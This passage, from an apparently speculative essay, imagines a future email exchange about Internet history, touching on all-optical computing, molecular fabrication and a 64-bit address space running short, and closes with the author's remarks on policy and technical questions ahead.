With over a billion computers in the system and most of the populations of information - intensive countries fully linked , some of the more technically - astute back at the turn of the millennium may have had some inkling of what was in store for the next two decades .

Subject : Re : Internet History Therese and Jon ,
This is really fascinating !
I found some more material , thanks to the Internet Society , which summarizes the technical developments over the last 20 years .
Apparently one of the key events was the development of all - optical transmission , switching and computing in a cost - effective way .
For a long time , this technology involved rather bulky equipment - some of the early 3DV clips from 2000 - 2005 showed rooms full of gear required to steer beams around .
A very interesting combination of fiber optics and three - dimensional electro- optical integrated circuits collapsed a lot of this to sizes more like what we are accustomed to today .
Using pico- and femto- molecular fabrication methods , it has been possible to build very compact , extremely high speed computing and communication devices .
I guess those guys at Xerox PARC who imagined that there might be hundreds of millions of computers in the world , hundreds or even thousands of them for each person , would be pleased to see how clear their vision was .
The only really bad thing , as I see it , is that those guys who were trying to figure out how to deal with Internet expansion really blew it when they picked a measly 64 bit address space .
I hear we are running really tight again .
I wonder why they did n't have enough sense just to allocate at least 1024 bits to make sure we'd have enough room for the obvious applications we can see we want , now ?

Final Comments
The letters end here , so we are left to speculate about many of the loose ends not tied up in this informal exchange .
Obviously , our current struggles ultimately will be resolved and a very different , information - intensive world will evolve from the present .
There are a great many policy , technical and economic questions that remain to be answered to guide our progress towards the environment described in part in these messages .
It will be an interesting two or three decades ahead !
